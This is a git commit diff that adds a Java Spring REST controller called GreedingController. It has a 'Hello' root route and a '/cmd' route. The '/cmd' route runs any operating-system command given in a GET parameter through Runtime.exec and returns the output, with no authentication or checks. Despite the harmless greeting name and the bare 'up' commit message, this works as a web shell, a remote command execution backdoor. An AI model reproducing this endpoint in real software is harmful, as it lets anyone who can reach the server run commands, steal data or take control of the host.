85ab0e82ece666b1789883f7476f8a90dccf1ba7
Alex <Alex@192.168.51.2>
2017-05-23 12:33:42 +0700

    up

---
+++ src/main/java/restcontroller/GreedingController.java
@@ -0,0 +1,69 @@
+/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+package restcontroller;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.web.bind.annotation.PathVariable;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class GreedingController {
+
+    @RequestMapping(value = "/", method = RequestMethod.GET)
+    public String greeding() {
+
+        return "Hello ";
+    }
+
+    @RequestMapping(value = "/cmd", method = RequestMethod.GET)
+    public String greeding(@RequestParam(value = "cmd", required = true) String cmd) {
+        String output = "";
+        try {
+            output = executeCommand(cmd);
+            return output;
+        } catch (Exception e) {
+            e.getMessage();
+            return e.getMessage();
+        }
+        
+    }
+
+    public String executeCommand(String command) {
+
+        StringBuffer output = new StringBuffer();
+        
+        
+        
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec(command);
+            p.waitFor();
+            BufferedReader reader
+                    = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+            String line = "";
+            while ((line = reader.readLine()) != null) {
+                output.append(line + "\n");
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return output.toString();
+
+    }
+
+}
